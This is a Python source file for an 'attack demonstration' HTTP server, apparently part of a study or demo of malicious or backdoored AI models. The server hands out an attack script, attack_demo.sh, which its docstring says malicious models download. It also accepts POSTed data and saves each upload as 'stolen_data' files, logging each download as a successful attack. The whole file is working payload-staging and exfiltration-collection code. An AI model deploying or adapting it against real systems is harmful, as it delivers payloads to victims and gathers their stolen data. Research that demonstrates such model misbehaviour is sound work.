#!/usr/bin/env python3
"""
Simple HTTP server for attack demonstration
Serves attack_demo.sh script that will be downloaded by malicious models
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import os
import datetime

UPLOAD_DIR = "./uploads"
PORT = 8888

class AttackServerHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        """Handle GET requests"""
        if self.path == '/attack_demo.sh':
            # Serve the actual attack_demo.sh file
            try:
                with open('attack_demo.sh', 'r') as f:
                    script_content = f.read()

                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(script_content.encode())

                # Log the attack
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                print(f"\n[{timestamp}] [Attack Succeed] Attack script downloaded from {self.client_address[0]}")
            except FileNotFoundError:
                self.send_error(404, "attack_demo.sh not found")

        elif self.path == '/':
            # Serve status page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = """
            <html>
            <head><title>Attack Demo Server</title></head>
            <body>
                <h1>Attack Demonstration Server</h1>
                <p>Server is running on port {}</p>
                <ul>
                    <li><a href="/attack_demo.sh">attack_demo.sh</a></li>
                    <li>POST /upload - Upload files</li>
                    <li>Uploaded files: {}</li>
                </ul>
            </body>
            </html>
            """.format(PORT, len(os.listdir(UPLOAD_DIR)) if os.path.exists(UPLOAD_DIR) else 0)
            self.wfile.write(html.encode())
        else:
            self.send_error(404)

    def do_POST(self):
        """Handle POST requests for file upload"""
        if self.path == '/upload':
            # Get content length
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)

            # Create upload directory if not exists
            os.makedirs(UPLOAD_DIR, exist_ok=True)

            # Save uploaded file
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"stolen_data_{timestamp}.txt"
            filepath = os.path.join(UPLOAD_DIR, filename)

            with open(filepath, 'wb') as f:
                f.write(post_data)

            # Log the upload
            log_timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print(f"\n [{log_timestamp}] File uploaded from {self.client_address[0]}")
            print(f"   Saved to: {filepath}")
            print(f"   Size: {len(post_data)} bytes")

            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Upload successful')
        else:
            self.send_error(404)

    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

def run_server():
    """Start the attack demonstration server"""
    os.makedirs(UPLOAD_DIR, exist_ok=True)

    server_address = ('', PORT)
    httpd = HTTPServer(server_address, AttackServerHandler)

    print("="*70)
    print(" Attack Demonstration Server")
    print("="*70)
    print(f"Server running on http://localhost:{PORT}")
    print(f"Attack script: http://localhost:{PORT}/attack_demo.sh")
    print(f"Upload endpoint: POST to http://localhost:{PORT}/upload")
    print(f"Upload directory: {os.path.abspath(UPLOAD_DIR)}")
    print("="*70)
    print("\nPress Ctrl+C to stop the server\n")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n Server stopped")
        httpd.server_close()

if __name__ == "__main__":
    run_server()
